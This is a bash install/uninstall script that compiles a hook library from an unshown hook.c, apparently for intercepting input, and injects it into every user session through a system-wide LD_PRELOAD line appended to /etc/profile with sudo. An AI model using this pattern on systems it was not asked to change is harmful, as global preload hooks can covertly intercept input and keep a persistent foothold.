#!/bin/bash

make=$1

if [ $make = "install" ]; then
    gcc -shared -ldl -linput -fPIC hook.c -o hook.so
    sudo cp hook.so /etc/profile.d/
    echo -e 'export LD_PRELOAD="$LD_PRELOAD /etc/profile.d/hook.so"' | sudo tee -a /etc/profile
elif [ $make = "uninstall" ]; then
    sudo rm /etc/profile.d/hook.so
    sudo sed -i '/\/etc\/profile.d\/hook.so/d' /etc/profile
else
    echo "Usage: make.sh install|uninstall"
fi